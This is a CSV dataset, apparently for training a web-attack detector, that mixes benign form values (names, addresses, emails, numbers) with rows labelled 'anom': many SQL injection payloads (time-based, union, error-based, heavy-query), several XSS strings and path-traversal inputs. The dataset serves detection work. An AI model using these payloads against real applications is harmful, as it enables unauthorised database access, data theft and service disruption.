payload,length,attack_type,label
73732702s,9,norm,norm
"1'||(select 'svbf' where 7017=7017 or elt(6272=6272,sleep(5)))||'",65,sqli,anom
47160,5,norm,norm
f6lo40r06,9,norm,norm
siguemepol0o,12,norm,norm
siede@comodepilarse.ye,22,norm,norm
psitacosis,10,norm,norm
10335,5,norm,norm
tordellego,10,norm,norm
42010181z,9,norm,norm
02600,5,norm,norm
5445,4,norm,norm
55585768n,9,norm,norm
villapalacios,13,norm,norm
06460,5,norm,norm
empel6tarse,11,norm,norm
1 where 1931=1931 and sleep(5)--,32,sqli,anom
03827,5,norm,norm
1')) and 6240=('qqpjq'||(select case 6240 when 6240 then 1 else 0 end from rdb$database)||'qzvzq') and (('diyb' like 'diyb,122,sqli,anom
5939201790739270,16,norm,norm
planthar,8,norm,norm
64556150a,9,norm,norm
08447437c,9,norm,norm
8495937407634836,16,norm,norm
arrobador,9,norm,norm
overman@saavedradiaz.travel,27,norm,norm
muniello llubet,15,norm,norm
">""<img src=&{document.cookie=true;};>",37,xss,anom
"joaquin verdaguer, 183",22,norm,norm
niu,3,norm,norm
"froilan de la serna, 185",24,norm,norm
kathrine,8,norm,norm
geffner-schoo@bacoespecialseleccin.bm,37,norm,norm
8615,4,norm,norm
"1"" procedure analyse(extractvalue(5840,concat(0x5c,0x7171706a71,(select (case when (5840=5840) then 1 else 0 end)),0x717a767a71)),1) and ""acbq"" like ""acbq",154,sqli,anom
"-2204'||(select 'bwae' from dual where 4884=4884 union all select 4884,4884,4884,4884,4884,4884,4884,4884,4884,4884#",116,sqli,anom
"paratge palmira, 112, 5-b",25,norm,norm
"-1485'))) union all select 7661,7661,7661,7661,7661--",53,sqli,anom
98538229l,9,norm,norm
<<script>document.cookie=true;</script>,39,xss,anom
"-5115"" union all select 1642,1642,1642,1642,1642,1642,1642,1642--",65,sqli,anom
eluney,6,norm,norm
atos,4,norm,norm
pl. guerrero strachan s/n 4-a,29,norm,norm
46324867s,9,norm,norm
"-1000"" or 3440=cast((chr(113)||chr(113)||chr(112)||chr(106)||chr(113))||(select (case when (3440=3440) then 1 else 0 end))::text||(chr(113)||chr(122)||chr(118)||chr(122)||chr(113)) as numeric) and ""isbq""=""isbq",209,sqli,anom
iocntrl,7,norm,norm
1'||(select 'rjis' from dual where 7696=7696 and 3754=(select upper(xmltype(chr(60)||chr(58)||chr(113)||chr(113)||chr(112)||chr(106)||chr(113)||(select (case when (3754=3754) then 1 else 0 end) from dual)||chr(113)||chr(122)||chr(118)||chr(122)||chr(113)||chr(62))) from dual))||',280,sqli,anom
gambs galatioto,15,norm,norm
ansorger,8,norm,norm
"1) as fgqe where 1526=1526 and (select 2*(if((select * from (select concat(0x7171706a71,(select (elt(3484=3484,1))),0x717a767a71,0x78))s), 8446744073709551610, 8446744073709551610)))--",184,sqli,anom
jose cadalso s/n 7d,19,norm,norm
railey@g-audio.ic,17,norm,norm
3789354491351928,16,norm,norm
c/ doctor coll s/n 8g,21,norm,norm
34295530t,9,norm,norm
catalda,7,norm,norm
montferri,9,norm,norm
"1"")) or char(119)||char(100)||char(99)||char(121)=regexp_substring(repeat(right(char(1441),0),5000000000),null)--",113,sqli,anom
"paraje antonio de nebrija 39,",29,norm,norm
savoula,7,norm,norm
pagnol@tintaultravioleta.gob,28,norm,norm
"1%""))) union all select null,null,null,null,null,null,null,null--",65,sqli,anom
benalmdena,10,norm,norm
1'));waitfor delay '0:0:5'--,28,sqli,anom
"1'+(select tafk where 9652=9652;select benchmark(5000000,md5(0x714e4153))#",74,sqli,anom
8772381547327931,16,norm,norm
"1"") as pwvu where 8267=8267;select dbms_pipe.receive_message(chr(66)||chr(67)||chr(79)||chr(101),5) from dual--",111,sqli,anom
18540,5,norm,norm
"1%""));select (case when (9931=3424) then 1 else 9931*(select 9931 from master..sysdatabases) end)--",99,sqli,anom
"-7916')) union all select 9299,9299,9299,9299,9299,9299,9299,9299,9299,9299#",76,sqli,anom
1%') or sleep(5) and ('%'=',27,sqli,anom
46294,5,norm,norm
m601c1te,8,norm,norm
"1""))) and 6510=(select count(*) from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7) and (((""epwi"" like ""epwi",181,sqli,anom
"1%""));select count(*) from domain.domains as t1,domain.columns as t2,domain.tables as t3 and ((""%""=""",100,sqli,anom
diez lizano,11,norm,norm
6467099706129021,16,norm,norm
sadeghi,7,norm,norm
1%')) rlike sleep(5) and (('%'=',32,sqli,anom
973,3,norm,norm
1' in boolean mode);select (case when (4306=2815) then 4306 else 1/(select 0) end)--,84,sqli,anom
"1') where 8211=8211 union all select null,null,null,null,null#",62,sqli,anom
"germanies 18,",13,norm,norm
8747300653660135,16,norm,norm
fernald,7,norm,norm
rajarshi,8,norm,norm
cuellar reino,13,norm,norm
enratonarse,11,norm,norm
luego,5,norm,norm
"1"") where 1144=1144 and 2006=2006",33,sqli,anom
di rado elejalde,16,norm,norm
larraul,7,norm,norm
faraday,7,norm,norm
67094993z,9,norm,norm
overton,7,norm,norm
aluino,6,norm,norm
ochoa7,6,norm,norm
olmos de esgueva,16,norm,norm
10745236g,9,norm,norm
7ans286,7,norm,norm
1)) as xcsm where 9231=9231;select sleep(5)#,44,sqli,anom
-6310 or 6715=3399,18,sqli,anom
"1"") as nfpe where 2679=2679;select * from generate_series(4592,4592,case when (4592=4592) then 1 else 0 end) limit 1--",118,sqli,anom
"1"")) rlike sleep(5)#",20,sqli,anom
hortezuela de ocn,17,norm,norm
sangborivutr@ssextremadura.gr,29,norm,norm
47339400h,9,norm,norm
co80j44l4,9,norm,norm
celeste_bryon@skullride.ki,26,norm,norm
pastukhov@pecher.iq,19,norm,norm
1) where 1929=1929 and (select * from (select(sleep(5)))fzno)--,63,sqli,anom
"1')) and 9254=(select count(*) from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4)--",112,sqli,anom
"1"")) union all select null#",27,sqli,anom
4282,4,norm,norm
"c/ estambul, 117",16,norm,norm
1'+(select 'jtvq' where 8288=8288 and (select * from (select(sleep(5)))gcrr)#,77,sqli,anom
25186,5,norm,norm
peiser,6,norm,norm
1')) as clbc where 5649=5649;begin dbms_lock.sleep(5); end--,60,sqli,anom
garam2nte,9,norm,norm
espndola pavajeau,17,norm,norm
pari073l,8,norm,norm
"1"") where 6128=6128 and char(120)||char(106)||char(117)||char(85)=regexp_substring(repeat(right(char(9981),0),5000000000),null)--",129,sqli,anom
"1"" or 4240=(select 4240 from pg_sleep(5))--",43,sqli,anom
"1'+(select 'aphz' where 1933=1933 union all select null,null,null,null,null,null#",81,sqli,anom
fariba,6,norm,norm
"1) and elt(1210=1210,sleep(5))",30,sqli,anom
confiadora,10,norm,norm
astrolito,9,norm,norm
/aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa..............{file},1047,path-traversal,anom
29380,5,norm,norm
wooland@indagacion.td,21,norm,norm
henriquez femenias,18,norm,norm
1)) and 9198=9198--,19,sqli,anom
aracena,7,norm,norm
legrand@viajesinternacionales.si,32,norm,norm
"1%')) union all select null,null,null,null,null,null,null,null,null--",69,sqli,anom
"1%"") or 9643=(select count(*) from domain.domains as t1,domain.columns as t2,domain.tables as t3) and (""%""=""",108,sqli,anom
lightner.manor@rosaserigrafia.as,32,norm,norm
98970543w,9,norm,norm
"1%' or 5286=(select count(*) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5) and '%'='",109,sqli,anom
1466,4,norm,norm
"1%"") union all select null,null,null,null,null,null,null#",57,sqli,anom
romilda,7,norm,norm
7771108702507095,16,norm,norm
h8r66o,6,norm,norm
9528500439395561,16,norm,norm
4i7sp375,8,norm,norm
"1') or 2367=(select count(*) from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4)--",110,sqli,anom
spaeth@directoriogratuito.kr,28,norm,norm
"1')) and 6537=dbms_pipe.receive_message(chr(76)||chr(116)||chr(117)||chr(65),5) and (('zknl'='zknl",98,sqli,anom
shan-min,8,norm,norm
robledo,7,norm,norm
45100,5,norm,norm
"calle udal hilerria, 11, 11?d",29,norm,norm
77000029p,9,norm,norm
40560,5,norm,norm
redolat cardiel,15,norm,norm
durham@copiar.com.ke,20,norm,norm
arditi-alexis@capitalinvest.vc,30,norm,norm
"-8754""))) union all select 7391,7391,7391,7391,7391,7391,7391--",63,sqli,anom
-3499'))) or 2724 in ((char(113)+char(113)+char(112)+char(106)+char(113)+(select (case when (2724=2724) then char(49) else char(48) end))+char(113)+char(122)+char(118)+char(122)+char(113))) and ((('nzap' like 'nzap,214,sqli,anom
4354c07a,8,norm,norm
agobiar,7,norm,norm
07383536f,9,norm,norm
0496158701394687,16,norm,norm
"calle santa corda, 84, 3?h",26,norm,norm
"1"" or 6979=like('abcdefg',upper(hex(randomblob(500000000/2))))--",64,sqli,anom
pojmaevich tissera,18,norm,norm
1;select (case when (6276=6276) then 6276 else 6276*(select 6276 from information_schema.character_sets) end)#,110,sqli,anom
7aria22,7,norm,norm
"1') where 9221=9221 and (select 2*(if((select * from (select concat(0x7171706a71,(select (elt(3484=3484,1))),0x717a767a71,0x78))s), 8446744073709551610, 8446744073709551610)))--",177,sqli,anom
9990220996322149,16,norm,norm
1%'))) and 4595=4595#,21,sqli,anom
spradlin@pcvirus.dz,19,norm,norm
"1%"") or 6793=(select 6793 from pg_sleep(5)) and (""%""=""",54,sqli,anom
lamarre,7,norm,norm
luciano,7,norm,norm
"1') or 2633=dbms_pipe.receive_message(chr(112)||chr(65)||chr(65)||chr(103),5) and ('vxqs'='vxqs",95,sqli,anom
7677,4,norm,norm
fowler,6,norm,norm
51egible,8,norm,norm
kosmalska_gayou@inversioneolica.mv,34,norm,norm
peligros,8,norm,norm
7701,4,norm,norm
"1) where 5309=5309 or 7552=(select count(*) from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4)--",125,sqli,anom
"c/ cardenal cisneros 58,",24,norm,norm
grinnage@programagestionerp.kn,30,norm,norm
92793320g,9,norm,norm
"-4028) where 3244=3244 union all select 3244,3244,3244,3244,3244,3244,3244,3244--",81,sqli,anom
kempler7,8,norm,norm
"aldea, l'",9,norm,norm
justis8,7,norm,norm
"1')) as cbka where 3176=3176 and 8407=(select count(*) from generate_series(1,5000000))--",89,sqli,anom
/aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa/../../../../../../{file},1052,path-traversal,anom
"1'+(select 'suzs' where 2905=2905 and 4241=convert(int,(select char(113)+char(113)+char(112)+char(106)+char(113)+(select (case when (4241=4241) then char(49) else char(48) end))+char(113)+char(122)+char(118)+char(122)+char(113))))+'",232,sqli,anom
"1""));select case when 1802=7063 then 1 else null end--",54,sqli,anom
21700,5,norm,norm
"><script>alert(""vlab"")</script>",31,xss,anom
mary-ann,8,norm,norm
ayyuce,6,norm,norm
34419,5,norm,norm
1%')) or (select * from (select(sleep(5)))sddo)#,48,sqli,anom
-5350)) or 9323=9323#,21,sqli,anom
"plaza de la constitucion 40, 5e",31,norm,norm
"1' or 8514=benchmark(5000000,md5(0x544d5a4c))#",46,sqli,anom
kaz@3horas.com,14,norm,norm
ca61u13ia-0,11,norm,norm
"avda. de pablo iglesias, s/n 2?g",32,norm,norm
-8409)) as ipbz where 9984=9984 or 3371=3869,44,sqli,anom
3679,4,norm,norm
-7636') or 5898=8880 and ('sjuv'='sjuv,38,sqli,anom
"1%"") union all select null,null,null,null#",42,sqli,anom
harkin@escapadajoven.gq,23,norm,norm
"1%""))) and char(111)||char(77)||char(121)||char(88)=regexp_substring(repeat(left(crypt_key(char(65)||char(69)||char(83),null),0),500000000),null) and (((""%""=""",158,sqli,anom
"-5320 where 8051=8051 or 5023=ctxsys.drithsx.sn(5023,(chr(113)||chr(113)||chr(112)||chr(106)||chr(113)||(select (case when (5023=5023) then 1 else 0 end) from dual)||chr(113)||chr(122)||chr(118)||chr(122)||chr(113)))--",218,sqli,anom
91624121x,9,norm,norm
bernette2,9,norm,norm
"document.getelementbyid(""div1"").innerhtml;</script>",51,xss,anom
"-8819"") where 9119=9119 or 1570=convert(int,(select char(113)+char(113)+char(112)+char(106)+char(113)+(select (case when (1570=1570) then char(49) else char(48) end))+char(113)+char(122)+char(118)+char(122)+char(113)))--",220,sqli,anom
-1890'))) or 8526=1389 and ((('ecgt'='ecgt,42,sqli,anom
ricci@redhost.is,16,norm,norm
herculano,9,norm,norm
-1714' union all select 6687--,30,sqli,anom
"1 where 9869=9869 union all select null,null#",45,sqli,anom
"1'||(select 'xbvz' from dual where 1632=1632 union all select null,null,null,null,null,null,null,null--",103,sqli,anom
rasche2@cirugiaparpado.de,25,norm,norm
ephrayim,8,norm,norm
1'||(select 'abjv' from dual where 4200=4200;begin dbms_lock.sleep(5); end)||',78,sqli,anom
claver grifell,14,norm,norm
"-8544%"" or 6872=6872 and ""%""=""",30,sqli,anom
kilbank,7,norm,norm
chicon merlo,12,norm,norm
chinarro,8,norm,norm
"1 or elt(5873=5873,sleep(5))#",29,sqli,anom
anatoly,7,norm,norm
"1""))) or 5356=(select count(*) from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7)--",157,sqli,anom
depalma,7,norm,norm
pijahumeda,10,norm,norm
mkpwent,7,norm,norm
1'||(select 'bsbv' from dual where 5276=5276 or (select * from (select(sleep(5)))ydpu))||',90,sqli,anom
huari,5,norm,norm
"1') as idqc where 5288=5288 and elt(1210=1210,sleep(5))--",57,sqli,anom
"1%"")) and 7756=dbms_utility.sqlid_to_sqlhash((chr(113)||chr(113)||chr(112)||chr(106)||chr(113)||(select (case when (7756=7756) then 1 else 0 end) from dual)||chr(113)||chr(122)||chr(118)||chr(122)||chr(113))) and ((""%""=""",220,sqli,anom
ochagava/otsagabia,18,norm,norm
1')) order by 1#,16,sqli,anom
09831514a,9,norm,norm
"saus, camallera i llampaies",27,norm,norm
"1';select * from generate_series(4465,4465,case when (4465=6232) then 1 else 0 end) limit 1--",93,sqli,anom
cirio,5,norm,norm
5855,4,norm,norm
"praza san antonio da florida, 27,",33,norm,norm
9959095212447652,16,norm,norm
815,3,norm,norm
baudoin,7,norm,norm
"1""))) and 2006=2006",19,sqli,anom
(case when 5640=5640 then 5640 else null end),45,sqli,anom
"1'+(select syrz where 7699=7699 union all select null,null,null#",64,sqli,anom
losar de la vera,16,norm,norm
"-1620)) union all select 6257,6257,6257,6257,6257,6257,6257,6257,6257,6257--",76,sqli,anom
tila,4,norm,norm
yasm,4,norm,norm
grupo cooperativa obreros talleres deusto 147 6?h,49,norm,norm
etchieso,8,norm,norm
"1' and 3824=benchmark(5000000,md5(0x76555642)) and 'hmqq'='hmqq",63,sqli,anom
"1')) or char(117)||char(111)||char(105)||char(100)=regexp_substring(repeat(left(crypt_key(char(65)||char(69)||char(83),null),0),500000000),null) and (('aovy'='aovy",163,sqli,anom
36815dat1ra,11,norm,norm
"-2131"" or 2724 in ((char(113)+char(113)+char(112)+char(106)+char(113)+(select (case when (2724=2724) then char(49) else char(48) end))+char(113)+char(122)+char(118)+char(122)+char(113))) and ""wpsf"" like ""wpsf",208,sqli,anom
1')));select (case when (9246=6326) then 9246 else 9246*(select 9246 from mysql.db) end)#,89,sqli,anom
"c/ moncayo, 36, 10-d",20,norm,norm
0390750196070955,16,norm,norm
43700,5,norm,norm
josy,4,norm,norm
"1"" and sleep(5)#",16,sqli,anom
agra leuco,10,norm,norm
6759860992373102,16,norm,norm
45,2,norm,norm
1') where 8086=8086 and 1430=7941--,35,sqli,anom
thirugna,8,norm,norm
"pobla de crvoles, la",20,norm,norm
6785,4,norm,norm
chaney2@adondeir.ng,19,norm,norm
6848759858802316,16,norm,norm
"1 where 6881=6881 procedure analyse(extractvalue(5840,concat(0x5c,0x7171706a71,(select (case when (5840=5840) then 1 else 0 end)),0x717a767a71)),1)--",149,sqli,anom
riordan,7,norm,norm
2510637221475671,16,norm,norm
"1"");select count(*) from generate_series(1,5000000) and (""jzmg""=""jzmg",69,sqli,anom
"1' and 8514=(select count(*) from domain.domains as t1,domain.columns as t2,domain.tables as t3) and 'tfso'='tfso",113,sqli,anom
cacahuate,9,norm,norm
"1')) as bsvk where 5985=5985 and extractvalue(7982,concat(0x5c,0x7171706a71,(select (elt(7982=7982,1))),0x717a767a71))--",120,sqli,anom
"1"" where 6501=6501;select (case when (3855=3855) then 3855 else 1/(select 0) end)--",83,sqli,anom
"c/ la lila, 83,",15,norm,norm
"1 and extractvalue(7982,concat(0x5c,0x7171706a71,(select (elt(7982=7982,1))),0x717a767a71))-- sbvl",98,sqli,anom
"1') and elt(1210=1210,sleep(5)) and ('gtov' like 'gtov",54,sqli,anom
escncido,8,norm,norm
45840,5,norm,norm
deagle,6,norm,norm
"1'||(select 'dpce' from dual where 5261=5261 union all select null,null,null,null,null,null--",93,sqli,anom
"1"" and 7756=dbms_utility.sqlid_to_sqlhash((chr(113)||chr(113)||chr(112)||chr(106)||chr(113)||(select (case when (7756=7756) then 1 else 0 end) from dual)||chr(113)||chr(122)||chr(118)||chr(122)||chr(113))) and ""jgcv""=""jgcv",222,sqli,anom
epifita,7,norm,norm
"1 union all select null,null,null,null,null,null,null#",54,sqli,anom
"1',iif(9496=4153,1,1/0)",23,sqli,anom
hasbrouc,8,norm,norm
1')) and 2006=2006,18,sqli,anom
dodsworth@sevach.co,19,norm,norm
"1%'))) or row(1045,7562)>(select count(*),concat(0x7171706a71,(select (elt(1045=1045,1))),0x717a767a71,floor(rand(0)*2))x from (select 8488 union select 5584 union select 3051 union select 1210)a group by x) and ((('%'='",220,sqli,anom
29850288z,9,norm,norm
antonelli-ankrum@escarba.pm,27,norm,norm
"1')) as hfra where 6500=6500 and 9660=(select count(*) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5)--",127,sqli,anom
1) as mtda where 3951=3951;select (case when (4666=4666) then 1 else 4666*(select 4666 from master..sysdatabases) end)--,120,sqli,anom
abordonar,9,norm,norm
felleghy@zafranet.md,20,norm,norm
trisha,6,norm,norm
"1"" or 5286=(select count(*) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5) and ""jtgs"" like ""jtgs",120,sqli,anom
72,2,norm,norm
"1"") as rqpp where 9383=9383 or 7417=(select count(*) from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3)--",129,sqli,anom
32566111c,9,norm,norm
melosa,6,norm,norm
"1) where 1443=1443 union all select null,null,null,null,null#",61,sqli,anom
eduarda,7,norm,norm
"<div style=""width: expression(alert('xss'));"">",46,xss,anom
muehle,6,norm,norm
45480,5,norm,norm
"1') and char(120)||char(106)||char(117)||char(85)=regexp_substring(repeat(right(char(9981),0),5000000000),null) and ('rqyz'='rqyz",129,sqli,anom
"-5431""))) or 4747=dbms_utility.sqlid_to_sqlhash((chr(113)||chr(113)||chr(112)||chr(106)||chr(113)||(select (case when (4747=4747) then 1 else 0 end) from dual)||chr(113)||chr(122)||chr(118)||chr(122)||chr(113))) and (((""ipmo""=""ipmo",231,sqli,anom
"pintanos, los",13,norm,norm
"1'))) and 3824=benchmark(5000000,md5(0x76555642)) and ((('zurf'='zurf",69,sqli,anom
ohtomo@aldufa.im,16,norm,norm
"1"")) and 4386=utl_inaddr.get_host_address(chr(113)||chr(113)||chr(112)||chr(106)||chr(113)||(select (case when (4386=4386) then 1 else 0 end) from dual)||chr(113)||chr(122)||chr(118)||chr(122)||chr(113)) and ((""bfko""=""bfko",222,sqli,anom
1596,4,norm,norm
16269,5,norm,norm
drier@hotelesymas.cl,20,norm,norm
castell-platja d'aro,20,norm,norm
chamberlin@nikemujeres.py,25,norm,norm
bellaguarda,11,norm,norm
br8c99ma4290,12,norm,norm
tra9sformable,13,norm,norm
"1%"") or 7552=(select count(*) from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4) and (""%""=""",120,sqli,anom
4ode5ista,9,norm,norm
hitching,8,norm,norm
marsal infante,14,norm,norm
linares barreras,16,norm,norm
genciano,8,norm,norm
"1"") as fkco where 8877=8877 or (select 9173 from(select count(*),concat(0x7171706a71,(select (elt(9173=9173,1))),0x717a767a71,floor(rand(0)*2))x from information_schema.character_sets group by x)a)--",199,sqli,anom
"1'||(select 'vixv' from dual where 7704=7704 union all select null,null,null,null,null--",88,sqli,anom
braschi_courtneidge@djbroadcast.an,34,norm,norm
"1%"")) order by 1#",17,sqli,anom
"1%')) procedure analyse(extractvalue(9627,concat(0x5c,(benchmark(5000000,md5(0x4b774c75))))),1)#",96,sqli,anom
pavor,5,norm,norm
amarr1,6,norm,norm
1'||(select 'yuku' where 7480=7480;begin user_lock.sleep(5); end)||',68,sqli,anom
34886,5,norm,norm
"c/ jacinto benavente 109, 10?d",30,norm,norm
"1"") or 5286=(select count(*) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5) and (""nnmz"" like ""nnmz",122,sqli,anom
muzas,5,norm,norm
arrindell@salsaspain.so,23,norm,norm
khalid,6,norm,norm
3422,4,norm,norm
"1')) or 2633=dbms_pipe.receive_message(chr(112)||chr(65)||chr(65)||chr(103),5) and (('ylql' like 'ylql",102,sqli,anom
3471,4,norm,norm
c/ torre de romo s/n 1f,23,norm,norm
enjoyelada,10,norm,norm
45939,5,norm,norm
paseo don juan de borbon 90 3?c,31,norm,norm
"1'));select * from generate_series(4975,4975,case when (4975=9615) then 1 else 0 end) limit 1--",95,sqli,anom
"calle duque de zaragoza s/n,",28,norm,norm
8e35o502da7,11,norm,norm
oliveira,8,norm,norm
"1'+(select 'tjvt' where 2463=2463;create or replace function sleep(int) returns int as '/lib/libc.so.6','sleep' language 'c' strict; select sleep(5)--",150,sqli,anom
1') as ubvf where 5923=5923 and 8490=4925--,43,sqli,anom
-6567')) union all select 3217#,31,sqli,anom
roson-hawke@horiginales.bh,26,norm,norm
anda matamalas,14,norm,norm
calle de joan miro s/n,22,norm,norm
luhmaan,7,norm,norm
1)) rlike (select * from (select(sleep(5)))vwyq)#,49,sqli,anom
lareine2,8,norm,norm
1')) and 7756=dbms_utility.sqlid_to_sqlhash((chr(113)||chr(113)||chr(112)||chr(106)||chr(113)||(select (case when (7756=7756) then 1 else 0 end) from dual)||chr(113)||chr(122)||chr(118)||chr(122)||chr(113))) and (('hbwk' like 'hbwk,231,sqli,anom
3411,4,norm,norm
-3304')) order by 1--,21,sqli,anom
"1'||(select 'hfbt' where 7204=7204 union all select null,null,null,null,null,null,null,null,null,null--",103,sqli,anom
-5449' or 4493=utl_inaddr.get_host_address(chr(113)||chr(113)||chr(112)||chr(106)||chr(113)||(select (case when (4493=4493) then 1 else 0 end) from dual)||chr(113)||chr(122)||chr(118)||chr(122)||chr(113)) and 'ryvy' like 'ryvy,226,sqli,anom
kovac,5,norm,norm
mcginnis-dellagnese@storagecraft.na,35,norm,norm
3905556905973113,16,norm,norm
scissons3,9,norm,norm
"1"" (select (case when (5451=5451) then regexp_substring(repeat(right(char(5451),0),500000000),null) else char(108)||char(76)||char(112)||char(116) end) from information_schema.system_users) and ""kszu""=""kszu",206,sqli,anom
1'||(select 'dfmw' from dual where 1723=1723;select (case when (4769=4769) then 4769 else 4769*(select 4769 from mysql.db) end)#,128,sqli,anom
"-6928"")) or 3440=cast((chr(113)||chr(113)||chr(112)||chr(106)||chr(113))||(select (case when (3440=3440) then 1 else 0 end))::text||(chr(113)||chr(122)||chr(118)||chr(122)||chr(113)) as numeric) and ((""mxhr"" like ""mxhr",218,sqli,anom
"1"") or 8384=like('abcdefg',upper(hex(randomblob(500000000/2)))) and (""vkqt""=""vkqt",81,sqli,anom
1%')) rlike (select * from (select(sleep(5)))vwyq)#,51,sqli,anom
"1%')) union all select null,null,null,null,null,null#",53,sqli,anom
02054707w,9,norm,norm
